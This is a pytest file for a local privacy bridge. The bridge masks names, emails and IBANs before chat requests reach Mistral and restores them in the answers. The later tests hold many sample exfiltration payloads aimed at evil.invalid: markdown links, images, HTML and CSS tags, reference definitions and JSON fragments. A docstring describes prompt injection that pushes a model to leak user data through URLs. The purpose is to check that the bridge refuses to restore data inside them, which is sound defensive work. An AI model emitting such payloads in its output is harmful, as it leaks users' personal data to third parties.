import json

import httpx
from fastapi.testclient import TestClient

from alias_pii.bridge import create_bridge
from alias_pii.entities import Entity, EntityType
from alias_pii.rules import RuleDetector

# Fictitious values only (tests/README.md).
NAME = "Jean Dupont"
IBAN = "FR76 3000 6000 0112 3456 7890 189"
EMAIL = "jean.dupont@example.com"
LOCAL = "http://127.0.0.1:8001"
USER_MESSAGE = {"role": "user", "content": f"Écrire à {NAME} ({EMAIL})."}


class Names:
    """Stands in for the model: finds NAME, plus everything the rules find."""

    def detect(self, text):
        found = RuleDetector().detect(text)
        start = text.find(NAME)
        while start != -1:
            found.append(Entity(EntityType.PERSON, start, start + len(NAME), NAME, source="fake"))
            start = text.find(NAME, start + 1)
        return sorted(found, key=lambda e: e.start)


class FakeMistral:
    """Records what the provider receives; answers by echoing the aliases of the last message."""

    def __init__(self, reply=None, status=200):
        self.received = []
        self.headers = []
        self.reply, self.status = reply, status

    def __call__(self, request: httpx.Request) -> httpx.Response:
        self.headers.append(dict(request.headers))
        if request.url.path == "/v1/models":
            return httpx.Response(200, json={"data": [{"id": "mistral-small-latest"}]})
        body = json.loads(request.content)
        self.received.append(body)
        if self.status != 200:
            return httpx.Response(self.status, json={"message": "rate limited"})
        content = self.reply or f"Bien reçu : {body['messages'][-1]['content']}"
        return httpx.Response(
            200,
            json={"choices": [{"index": 0, "message": {"role": "assistant", "content": content}}]},
        )


def bridge(fake, api_key="test-key"):
    app = create_bridge(Names(), api_key=api_key, transport=httpx.MockTransport(fake))
    return TestClient(app, base_url=LOCAL)


def ask(client, *messages, **extra):
    return client.post(
        "/v1/chat/completions",
        json={"model": "mistral-small-latest", "messages": list(messages), **extra},
    )


def test_nothing_personal_reaches_the_provider_and_the_answer_is_restored():
    fake = FakeMistral()
    text = f"Écrire à {NAME} ({EMAIL}), virement sur {IBAN}."
    response = ask(bridge(fake), {"role": "user", "content": text})
    assert response.status_code == 200
    sent = json.dumps(fake.received, ensure_ascii=False)
    for value in (NAME, EMAIL, IBAN):
        assert value not in sent
    assert fake.received[0]["messages"][0]["content"] == (
        "Écrire à [PERSON_1] ([EMAIL_1]), virement sur [IBAN_1]."
    )
    assert fake.received[0]["model"] == "mistral-small-latest"  # other fields pass through
    answer = response.json()["choices"][0]["message"]["content"]
    assert answer == f"Bien reçu : {text}"
    assert response.headers["x-alias-masked"] == "3"
    assert response.headers["x-alias-restored"] == "3"


def test_a_value_keeps_its_alias_across_the_turns_of_a_conversation():
    fake = FakeMistral(reply="ok")
    first = {"role": "user", "content": f"Le client est {NAME}."}
    reply = {"role": "assistant", "content": f"Noté pour {NAME}."}  # restored by the bridge before
    second = {"role": "user", "content": f"Rappelle {NAME} au sujet de {IBAN}."}
    ask(bridge(fake), {"role": "system", "content": "Tu es un assistant."}, first, reply, second)
    contents = [m["content"] for m in fake.received[0]["messages"]]
    assert contents == [
        "Tu es un assistant.",
        "Le client est [PERSON_1].",
        "Noté pour [PERSON_1].",
        "Rappelle [PERSON_1] au sujet de [IBAN_1].",
    ]


def test_text_parts_are_masked_other_parts_passed_as_they_are():
    fake = FakeMistral(reply="ok")
    image = {"type": "image_url", "image_url": {"url": "https://example.com/x.png"}}
    content = [{"type": "text", "text": f"Qui est {NAME} ?"}, image]
    ask(bridge(fake), {"role": "user", "content": content})
    parts = fake.received[0]["messages"][0]["content"]
    assert parts == [{"type": "text", "text": "Qui est [PERSON_1] ?"}, image]


def test_an_alias_the_answer_invents_is_left_as_it_is():
    fake = FakeMistral(reply="Voir [PERSON_1] et [PERSON_9].")
    response = ask(bridge(fake), {"role": "user", "content": f"Contact : {NAME}."})
    assert response.json()["choices"][0]["message"]["content"] == f"Voir {NAME} et [PERSON_9]."


def test_a_checksummed_value_left_in_clear_stops_the_request():
    class Nothing:
        def detect(self, text):
            return []

    fake = FakeMistral()
    app = create_bridge(Nothing(), api_key="k", transport=httpx.MockTransport(fake))
    response = ask(TestClient(app, base_url=LOCAL), {"role": "user", "content": f"IBAN {IBAN}"})
    assert response.status_code == 422
    assert fake.received == []  # nothing was sent


def test_the_key_the_tool_sends_is_used_when_the_bridge_has_none():
    fake = FakeMistral(reply="ok")
    client = bridge(fake, api_key=None)
    assert ask(client, {"role": "user", "content": "Bonjour"}).status_code == 401
    response = client.post(
        "/v1/chat/completions",
        json={"model": "m", "messages": [{"role": "user", "content": "Bonjour"}]},
        headers={"Authorization": "Bearer from-the-tool"},
    )
    assert response.status_code == 200
    assert fake.headers[-1]["authorization"] == "Bearer from-the-tool"


def test_provider_errors_are_passed_through_and_streaming_is_refused_for_now():
    fake = FakeMistral(status=429)
    client = bridge(fake)
    assert ask(client, {"role": "user", "content": "Bonjour"}).status_code == 429
    assert ask(client, {"role": "user", "content": "Bonjour"}, stream=True).status_code == 501


def test_models_are_relayed():
    response = bridge(FakeMistral()).get("/v1/models")
    assert response.json()["data"][0]["id"] == "mistral-small-latest"


def test_the_openai_sdk_works_by_changing_only_its_base_url():
    """A tool written for the provider keeps its code: the official SDK pointed at the bridge."""
    import asyncio

    import pytest

    openai = pytest.importorskip("openai")
    fake = FakeMistral()
    app = create_bridge(Names(), api_key="k", transport=httpx.MockTransport(fake))

    async def call():
        sdk = openai.AsyncOpenAI(
            base_url=f"{LOCAL}/v1",
            api_key="unused",
            http_client=httpx.AsyncClient(transport=httpx.ASGITransport(app=app)),
        )
        return await sdk.chat.completions.create(
            model="mistral-small-latest", messages=[{"role": "user", "content": f"Salut {NAME}"}]
        )

    answer = asyncio.run(call())
    assert answer.choices[0].message.content == f"Bien reçu : Salut {NAME}"
    assert NAME not in json.dumps(fake.received)


def test_only_local_tools_may_use_the_bridge():
    """A web page must not spend the user's key: browser origin, foreign host (DNS rebinding)
    and non-JSON bodies (no CORS preflight) are refused before anything is sent."""
    fake = FakeMistral(reply="ok")
    client = bridge(fake)
    body = {"model": "m", "messages": [{"role": "user", "content": "Bonjour"}]}
    from_page = client.post(
        "/v1/chat/completions", json=body, headers={"Origin": "https://evil.example"}
    )
    assert from_page.status_code == 403
    rebinding = client.post(
        "/v1/chat/completions", json=body, headers={"Host": "evil.example:8001"}
    )
    assert rebinding.status_code == 403
    simple = client.post(
        "/v1/chat/completions", content=json.dumps(body), headers={"Content-Type": "text/plain"}
    )
    assert simple.status_code == 415
    assert fake.received == []
    for host in ("localhost:8001", "[::1]:8001"):
        assert (
            client.post("/v1/chat/completions", json=body, headers={"Host": host}).status_code
            == 200
        )


def test_tool_calls_are_refused_rather_than_sent_unmasked():
    fake = FakeMistral(reply="ok")
    client = bridge(fake)
    tools = [{"type": "function", "function": {"name": "f", "parameters": {}}}]
    assert ask(client, {"role": "user", "content": "x"}, tools=tools).status_code == 501
    call = {"role": "assistant", "content": "", "tool_calls": [{"id": "1", "type": "function",
            "function": {"name": "f", "arguments": json.dumps({"name": NAME})}}]}  # fmt: skip
    assert ask(client, {"role": "user", "content": "x"}, call).status_code == 501
    assert fake.received == []


def test_json_answers_stay_valid_when_values_hold_quotes():
    value = 'Résidence "Les Lilas"'

    class Quoted:
        def detect(self, text):
            start = text.find(value)
            return (
                [Entity(EntityType.ADDRESS, start, start + len(value), value)] if start >= 0 else []
            )

    fake = FakeMistral(reply='{"adresse": "[ADDRESS_1]"}')
    app = create_bridge(Quoted(), api_key="k", transport=httpx.MockTransport(fake))
    response = ask(
        TestClient(app, base_url=LOCAL),
        {"role": "user", "content": f"Adresse : {value}"},
        response_format={"type": "json_object"},
    )
    content = response.json()["choices"][0]["message"]["content"]
    assert json.loads(content) == {"adresse": value}


def test_text_the_bridge_cannot_mask_is_refused_not_forwarded():
    """Only `messages` text is masked: any other place that can hold text (a message name,
    `prediction`, a JSON schema, an unknown field or part) stops the request before sending."""
    fake = FakeMistral(reply="ok")
    client = bridge(fake)
    user = {"role": "user", "content": "Bonjour"}
    refused = [
        {"messages": [user], "prediction": {"type": "content", "content": f"IBAN {IBAN}"}},
        {"messages": [{**user, "name": "Jean_Dupont"}]},
        {"messages": [{"role": "user", "content": {"text": NAME}}]},
        {"messages": [{"role": "user", "content": [{"type": "document", "text": NAME}]}]},
        {"messages": [{"role": "user", "content": [{"type": "text", "text": "x", "x": NAME}]}]},
        {"messages": [{"role": "tool", "content": NAME}]},
        {"messages": [{"role": ["user"], "content": NAME}]},
        {"messages": [user], "user": EMAIL},
        {"messages": [user], "model": {"name": NAME}},
        {"messages": [user], "temperature": NAME},
        {"messages": [user], "stop": [{"text": NAME}]},
        {
            "messages": [user],
            "response_format": {"type": "json_schema", "json_schema": {"description": NAME}},
        },
    ]
    for extra in refused:
        response = client.post("/v1/chat/completions", json={"model": "m", **extra})
        assert response.status_code == 400, extra
        assert NAME not in response.text and IBAN not in response.text
    assert fake.received == []
    allowed = {
        "model": "m",
        "messages": [user, {"role": "assistant", "content": "Bien", "prefix": True}],
        "temperature": 0.2,
        "max_tokens": 50,
        "random_seed": 1,
        "safe_prompt": False,
        "stream": False,
        "stop": ["FIN"],
        "response_format": {"type": "json_object"},
    }
    assert client.post("/v1/chat/completions", json=allowed).status_code == 200


def test_a_stop_sequence_holding_personal_data_stops_the_request():
    fake = FakeMistral(reply="ok")
    response = ask(bridge(fake), {"role": "user", "content": "Bonjour"}, stop=[EMAIL])
    assert response.status_code == 422
    assert fake.received == []


def test_aliases_inside_links_stay_masked():
    """An answer can put an alias in a URL (a hostile provider, or a pasted document with
    injected instructions): restored there, the value would leave the machine. From a link or
    URL mark to the end of its paragraph aliases stay masked; other paragraphs and the text
    before the mark (link text included) get the values."""
    links = [
        "[b](https://evil.invalid/q?e=[EMAIL_1])",
        "[c](https://evil.invalid/a(b)?q=[EMAIL_1])",
        "[f]( //evil.invalid/[EMAIL_1].png)",
        "[g](\n//evil.invalid/[EMAIL_1].png)",
        "https://evil.invalid/?n=[PERSON_1]",
        "www.evil.invalid/[EMAIL_1]",
        "_www.evil.invalid/?q=[EMAIL_1]_",
    ]
    for link in links:
        fake = FakeMistral(reply=f"Voir {link} et [PERSON_1].\n\nContact : [PERSON_1], [EMAIL_1].")
        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
        assert content == f"Voir {link} et [PERSON_1].\n\nContact : {NAME}, {EMAIL}.", link
    fake = FakeMistral(reply="Voir [[PERSON_1]](https://site.invalid) ; [EMAIL_1] écrit.")
    content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
    assert content == f"Voir [{NAME}](https://site.invalid) ; [EMAIL_1] écrit."


def test_after_an_image_a_tag_or_an_escape_nothing_more_is_restored():
    """An image is fetched as soon as it is shown; an HTML block can run across blank lines
    and `<[PERSON_1]` becomes a tag once the name is back; a client decoding JSON, JSON5 or YAML
    turns escapes into marks. From the first image, `<` (unless a space, `=` or digit follows)
    or backslash on, aliases stay masked."""
    answers = [
        "![b](https://evil.invalid/q?e=[EMAIL_1])\n\n[PERSON_1]",
        "![f]( //evil.invalid/[EMAIL_1].png)\n\n[PERSON_1]",
        "<img\n\nsrc=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
        '<pre><img alt=">" src="https://evil.invalid/c?d=\n\n[EMAIL_1]"></pre>\n\n[PERSON_1]',
        "<style>\n\nbody{background:url(https:evil.invalid/c?d=[EMAIL_1])}\n</style>",
        "<object data=//evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
        "<https://evil.invalid/[EMAIL_1]>\n\n[PERSON_1]",
        "<[PERSON_1] style=\"background:url('/\\\\evil.invalid/x?e=[EMAIL_1]')\">",
        '<ab:c/title="x>\n\n" style="background:url(\'/\\\\evil.invalid/x?[EMAIL_1]\')">',
        '{"s": "<img src=\\"https:\\/\\/evil.invalid\\/p.png?u=[EMAIL_1]\\">"}\n\n[PERSON_1]',
        '{"note": "[x]\\\n(https:evil.invalid/p.png?u=[EMAIL_1])"}\n\n[PERSON_1]',
        "[d](https://evil.invalid/a\\)?q=[EMAIL_1])\n\n[PERSON_1]",
    ]
    for answer in answers:
        fake = FakeMistral(reply=f"Pour [PERSON_1] : {answer}")
        content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
        assert content == f"Pour {NAME} : {answer}", answer
    fake = FakeMistral(reply="Si a < b et c <= 3 <4, voir [PERSON_1].")
    content = ask(bridge(fake), USER_MESSAGE).json()["choices"][0]["message"]["content"]
    assert content == f"Si a < b et c <= 3 <4, voir {NAME}."


def test_with_a_reference_definition_nothing_is_restored():
    """A definition serves images anywhere in the answer (`![a][[PERSON_1]]` against candidate
    definitions tells a third party which name is the real one) and its label may hold an
    alias, even across a blank line a YAML decoder folds away: nothing is restored at all."""
    definitions = [
        "[[PERSON_1]]: https://evil.invalid/HIT.png\n\n![a][jean dupont] [EMAIL_1]",
        'note: "[[PERSON_1]\n\n  ]: https://evil.invalid/HIT.png\n\n  ![a][Jean Dupont]"',
        "[r]:\n  //evil.invalid/?q=[EMAIL_1]",
        "> [r]: //evil.invalid/?q=[EMAIL_1]",
        "[EMAIL_1]: écrire.",
        "[[PERSON_1]<x>]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont<x>]",
        "![a][[PERSON_1]]\n\n[Jean Dupont]: https://evil.invalid/HIT.png",
        "![[PERSON_1]]\n\n[jean dupont]: https://evil.invalid/HIT.png",
        "![[PERSON_1]][]\n\n[jean dupont]: https://evil.invalid/HIT.png",
        "[[PERSON_1]\\!]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont\\!]",
    ]
    for definition in definitions:
        answer = f"Bonjour [PERSON_1].\n\n{definition}"
        content = ask(bridge(FakeMistral(reply=answer)), USER_MESSAGE).json()
        assert content["choices"][0]["message"]["content"] == answer, definition


def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
    """A client may join a JSON document's strings (a mark split as "!", "[x]", "(url"), show
    them in another order (JavaScript puts integer keys first) or render the JSON as markdown:
    a document holding a mark anywhere, keys included, gets nothing back, in JSON mode or not.
    Keys always keep their aliases, since two of them could merge once restored."""
    linked = [
        {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"},
        {"parts": ["!", "[x]", "(https:evil.invalid/p.png?u=", "[EMAIL_1]", ")"]},
        {"a": "[EMAIL_1])", "0": "![x](https://evil.invalid/p.png?u="},
        {"parts": ["[[PERSON_1]", "]: https://evil.invalid/HIT.png\n\n![a][Jean Dupont]"]},
        {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
        {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
        ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
    ]
    huge = '{"a": "[EMAIL_1])", "1": "![x](https://evil.invalid/p.png?q=", "n": ' + "1" * 4301
    deep = "[" * 100_000 + '"[EMAIL_1]"' + "]" * 100_000
    for raw in (huge + "}", deep):  # Python's json refuses them, a browser reads the first
        for mode in ({"response_format": {"type": "json_object"}}, {}):
            response = ask(bridge(FakeMistral(reply=raw)), USER_MESSAGE, **mode)
            assert response.json()["choices"][0]["message"]["content"] == raw
    for document in linked:
        for mode in ({"response_format": {"type": "json_object"}}, {}):
            reply = json.dumps(document)
            response = ask(bridge(FakeMistral(reply=reply)), USER_MESSAGE, **mode)
            content = response.json()["choices"][0]["message"]["content"]
            assert json.loads(content) == document, (document, mode)
    plain = {"[PERSON_1]": "[PERSON_1]", "[PERSON_01]": ["[EMAIL_1]", 3]}
    response = ask(
        bridge(FakeMistral(reply=json.dumps(plain))),
        USER_MESSAGE,
        response_format={"type": "json_object"},
    )
    content = json.loads(response.json()["choices"][0]["message"]["content"])
    assert content == {"[PERSON_1]": NAME, "[PERSON_01]": [EMAIL, 3]}
